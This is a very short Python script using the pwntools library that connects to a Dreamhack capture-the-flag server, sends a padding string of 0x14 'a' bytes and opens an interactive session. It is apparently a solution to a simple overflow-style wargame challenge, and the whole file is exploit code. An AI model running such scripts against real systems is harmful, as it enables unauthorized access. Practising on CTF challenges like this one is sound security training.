from pwn import *
context.update(log_level = 'debug')
p = remote('host1.dreamhack.games', 8517)
p.recvrepeat(1)
p.send('a'*0x14)
p.interactive()
